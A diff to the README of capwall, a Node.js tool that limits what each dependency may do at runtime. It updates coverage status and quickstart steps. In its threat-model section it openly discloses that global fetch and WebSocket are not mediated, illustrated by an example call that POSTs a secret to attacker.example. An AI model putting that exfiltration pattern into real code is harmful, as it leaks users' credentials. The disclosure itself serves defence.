@@ -4,12 +4,17 @@
 supply-chain malware — declare what each dependency is *allowed to do* (files, network,
 subprocesses, env, …), then enforce it at runtime.
 
-> Status: **fs vertical slice working (roadmap M1–M3).** The observe → policy → enforce loop
-> is live end-to-end for the `fs` capability on the CJS path: `capwall observe` emits a
-> starter policy from a real run, and `capwall enforce` denies-by-default with attributed
-> errors. The other shims (`net`, `child_process`, `worker_threads`, `env`, `vm`) and ESM
-> are not yet mediated — see [`docs/roadmap.md`](./docs/roadmap.md) (M4/M5) and the honest
-> scope note in [`docs/threat-model.md`](./docs/threat-model.md).
+> Status: **the roadmap is complete — M1–M5 and stretch S1–S4 are all implemented**
+> ([`docs/roadmap.md`](./docs/roadmap.md) has the milestone table, which is the one place
+> status is tracked). The observe → policy → enforce loop runs end-to-end on **both the CJS
+> `require` and the ESM `import` paths**, for `fs`, the egress modules
+> (`net`/`http`/`https`/`tls`/`http2`/`dgram`), `child_process`, `worker_threads`,
+> `process.env`, `vm`, and `.node` addon loads.
+>
+> **Nothing is published to npm yet** and every package is at version `0.0.0` — run it from a
+> clone (see [Quickstart](#quickstart-the-observe--enforce-loop)). And read
+> [`docs/threat-model.md`](./docs/threat-model.md) before relying on it: "implemented" is a
+> statement about coverage, not about strength, and capwall is deliberately not a sandbox.
 
 ---
 
@@ -23,8 +28,9 @@ interesting damage — credential exfiltration, wallet theft, lateral movement �
 happens.
 
 capwall closes that gap. It sits inside the running process and mediates the
-capability-sensitive surface (`fs`, `net`/`http(s)`, `child_process`, `worker_threads`,
-`process.env`, `vm`) **per owning package**. A logging library that suddenly opens a
+capability-sensitive surface (`fs`; `net`/`http`/`https`/`tls`/`http2`/`dgram`;
+`child_process`; `worker_threads`; `process.env`; `vm`; and `.node` addon loads) **per owning
+package**. A logging library that suddenly opens a
 socket to an unknown host, or a color-string helper that reads `process.env`, is a policy
 violation — logged in `observe` mode, denied in `enforce` mode.
 
@@ -84,29 +90,43 @@ lands; capwall assumes one got through and *contains what it can do at runtime*.
 4. **Auto-policy generation from a trace run** — `capwall observe` runs the target's
    entrypoint/test suite, records observed capabilities, and emits a starter
    `capabilities.json`. **Headline feature.**
-5. **Capability shims for the core surface** — `node:fs`, `node:net`/`node:http(s)`,
+5. **Capability shims for the core surface** — `node:fs`; the egress modules `node:net`,
+   `node:http`, `node:https`, `node:tls`, `node:http2`, `node:dgram` (each shimmed
+   separately — one does not cover another, see
+   [`docs/architecture.md`](./docs/architecture.md) § Capability shims);
    `node:child_process`, `node:worker_threads`, `process.env`, `node:vm`.
 
 **Stretch (post-MVP):** SBOM/CBOM import (CycloneDX → policy, NodeShield-compatible) in
 `packages/sbom-import`; native-addon (`.node`) load attribution and gating; a CI
-observed-vs-declared diff report (`capwall diff`); full ESM parity. See
-[`docs/roadmap.md`](./docs/roadmap.md) for status.
+observed-vs-declared diff report (`capwall diff`); full ESM parity.
+
+All five MVP steps and all four stretch items are implemented —
+[`docs/roadmap.md`](./docs/roadmap.md)'s milestone table is the single place status is
+tracked, and this list is a description of scope, not of progress.
 
 ---
 
 ## Quickstart (the observe → enforce loop)
 
-> Working today for the `fs` capability (CJS). The `net`/`env`/`child_process` parts of the
-> flow land with roadmap M4.
+> **capwall is not published to npm yet.** `@capwall/cli` and `@capwall/core` are not on the
+> registry (all four packages are at version `0.0.0`), so `pnpm add -D @capwall/cli` will
+> 404 today. Step 1 below builds it from a clone instead; every later step is exactly what
+> you would run against a published build. The whole loop — all capabilities, CJS and ESM —
+> works from a clone right now.
 
 ```bash
-# 1. Install capwall in your project
-pnpm add -D @capwall/cli
+# 1. Build capwall from a clone (there is no published package yet — see the note above).
+git clone https://github.com/williamzujkowski/capwall.git ~/src/capwall
+cd ~/src/capwall && pnpm install && pnpm build
+
+#    The CLI is then ~/src/capwall/packages/cli/dist/index.js. Run it by path, or alias it:
+alias capwall='node ~/src/capwall/packages/cli/dist/index.js'
+#    Then cd back to YOUR project — capwall uses its working directory as the project root.
 
 # 2. OBSERVE: run your app or test suite; capwall records what each package actually does
 #    and writes a starter policy. Nothing is blocked in this mode.
 capwall observe -- node ./src/server.js
-#   → wrote capabilities.json (12 packages, 41 observed capabilities)
+#   → [capwall] observed 41 capability event(s) across 12 package(s); wrote ./capabilities.json
 
 # 3. Review & tighten capabilities.json by hand. Remove anything a dep shouldn't need.
 
@@ -116,6 +136,11 @@ capwall enforce -- node ./src/server.js
 # Or let the committed policy decide: `capwall run` uses its "mode" field, so promoting a
 # project from observe to enforce is a one-word diff in a reviewed file.
 capwall run -- node ./src/server.js
+
+# 5. KEEP IT HONEST IN CI: `capwall diff` re-observes and reports anything the committed
+#    policy would deny — a dependency that started using a capability it never used before.
+#    Exit 0 = no drift, 1 = drift, 2 = usage error. `--json` for machine-readable output.
+capwall diff -- node ./src/server.js
 
 # Explain why a given call was allowed/denied:
 capwall explain pino fs:write ./logs/app.log
@@ -138,9 +163,22 @@ runs at application-runtime and does not go out of its way to break out of a cap
 shim.
 
 Native addons and subprocesses can be **gated** (whether they run) but not **confined**
-(what they do once running). Full details and comparison to the SES and Node-permission
-threat models are in [`docs/threat-model.md`](./docs/threat-model.md) — read it before
-relying on capwall for anything.
+(what they do once running). A `"native": true` grant in particular is a load-time decision
+with no confinement whatsoever — compiled code in the process reaches files, sockets and the
+environment without touching a shimmed JS builtin, so read it as trusting that package
+completely.
+
+One coverage gap is worth naming here rather than leaving to the appendix, because it is
+cheap for an attacker and needs no knowledge of capwall: **`globalThis.fetch` and
+`globalThis.WebSocket` are not mediated.** capwall intercepts *module* surfaces, and those
+globals never route through a module load, so a dependency calling
+`fetch("https://attacker.example/", { method: "POST", body: secret })` is neither denied nor
+logged. capwall's egress control covers the `net`/`http`/`https`/`tls`/`http2`/`dgram` module
+surfaces; pair it with network-level egress control if the global APIs matter to you.
+
+Full details, and the comparison to the SES and Node-permission threat models, are in
+[`docs/threat-model.md`](./docs/threat-model.md) — read it before relying on capwall for
+anything.
 
 ---
 
